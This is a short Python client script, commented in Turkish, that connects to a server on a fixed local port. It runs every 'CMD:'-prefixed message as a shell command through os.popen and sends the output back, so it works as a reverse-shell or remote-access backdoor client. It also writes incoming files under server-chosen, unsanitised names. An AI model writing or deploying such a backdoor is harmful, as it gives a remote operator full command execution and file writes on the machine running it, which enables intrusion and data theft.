import socket
import os
from colorama import Fore, Style, init
import pyfiglet

# Colorama'yı başlat
init(autoreset=True)

def print_logo():
    logo = pyfiglet.figlet_format("Client")
    print(Fore.GREEN + logo + Style.RESET_ALL)

def receive_file(client_socket):
    try:
        # Dosya adı ve boyutunu al
        header = client_socket.recv(1024).decode().split('\n')
        filename = header[0]
        file_size = int(header[1])
        
        # Dosyayı al
        with open(filename, 'wb') as file:
            file_data = client_socket.recv(file_size)
            file.write(file_data)
        print(f"{Fore.GREEN}Dosya '{filename}' başarıyla alındı.{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}Dosya alırken hata oluştu: {e}{Style.RESET_ALL}")

def main():
    print_logo()
    server_ip = '127.0.0.1'  # Localhost
    port = 62567             # Belirtilen port numarası

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
        client_socket.connect((server_ip, port))

        while True:
            # Komut veya dosya alma
            data = client_socket.recv(1024).decode()
            if data.startswith("CMD:"):
                command = data[4:]
                print(f"{Fore.GREEN}Sunucudan gelen komut: {command}{Style.RESET_ALL}")

                # Komutu çalıştır
                result = os.popen(command).read()

                # Sonuçları gönder
                client_socket.sendall(result.encode())
            elif data.startswith("FILE:"):
                filename = data[5:]
                print("Sunucudan dosya alınıyor...")
                receive_file(client_socket)

if __name__ == "__main__":
    main()
